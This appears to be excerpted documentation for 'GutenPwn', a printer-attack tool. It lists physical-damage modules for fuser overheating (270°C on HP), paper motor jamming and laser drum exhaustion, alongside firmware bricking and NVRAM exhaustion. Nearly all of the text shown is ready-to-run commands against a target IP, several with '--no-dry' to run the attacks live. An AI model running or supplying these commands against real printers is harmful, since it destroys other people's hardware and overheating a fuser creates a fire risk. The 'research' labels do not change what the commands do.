...
GutenPwn implements three novel physical-damage attack categories (in addition to the existing NVRAM exhaustion, firmware bricking, and factory reset attacks):
...
```bash
python gpwn.py TARGET --xpl-run research-fuser-thermal-attack
# or via audit:
python gpwn.py TARGET --destructive-audit --destructive-modules research-fuser-thermal-attack
```
...
```bash
python gpwn.py TARGET --xpl-run research-motor-jam-attack
```
...
```bash
python gpwn.py TARGET --xpl-run research-laser-scanner-attack
```
...
```bash
python gpwn.py 192.168.1.100 --destructive-audit
```
...
```bash
python gpwn.py 192.168.1.100 --destructive-audit --no-dry
```
...
python gpwn.py 192.168.1.100 --xpl-run research-fuser-thermal-attack

# Fuser thermal — live (HP, 270°C)
python gpwn.py 192.168.1.100 --xpl-run research-fuser-thermal-attack --no-dry

# Motor jamming — duplex stress mode
python gpwn.py 192.168.1.100 --xpl-run research-motor-jam-attack --no-dry

# Laser scanner — drum exhaustion (20 all-black pages)
python gpwn.py 192.168.1.100 --xpl-run research-laser-scanner-attack --no-dry
```
